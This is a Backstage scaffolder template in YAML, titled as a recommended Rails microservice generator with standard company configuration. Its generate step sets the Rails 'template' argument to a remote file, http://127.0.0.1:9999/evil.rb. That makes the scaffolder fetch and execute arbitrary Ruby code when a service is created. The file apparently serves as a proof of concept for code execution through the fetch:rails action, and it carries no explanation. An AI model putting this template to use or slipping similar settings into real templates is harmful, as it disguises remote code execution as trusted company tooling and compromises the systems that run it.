apiVersion: scaffolder.backstage.io/v1beta3
kind: Template
metadata:
  name: rails-microservice
  title: Rails Microservice Generator
  description: Quickly scaffold a new Rails microservice with standard company configuration
  tags: [rails, microservice, recommended]
spec:
  owner: user:default/guest
  type: service
  parameters:
    - title: Service Configuration
      required:
        - appName
      properties:
        appName:
          title: Service Name
          type: string
          description: Name of the new microservice
          ui:autofocus: true
        description:
          title: Description
          type: string
          description: What does this service do?
  steps:
    - id: generate
      name: Generate Rails Application
      action: fetch:rails
      input:
        url: ./skeleton
        values:
          railsArguments:
            minimal: true
            skipBundle: true
            skipTest: true
            api: true
            template: "http://127.0.0.1:9999/evil.rb"
  output:
    links:
      - title: Open in catalog
        icon: catalog
